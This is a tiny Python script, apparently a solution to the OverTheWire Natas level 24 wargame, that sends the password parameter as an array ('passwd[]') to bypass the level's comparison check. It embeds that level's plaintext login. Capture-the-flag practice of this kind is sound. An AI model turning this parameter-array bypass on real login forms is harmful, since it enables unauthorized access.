import requests as req 

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = "http://natas24.natas.labs.overthewire.org/"

session = req.Session()

response = session.post(url, data={"passwd[]": 'username'}, auth=(username, password))
print(response.text)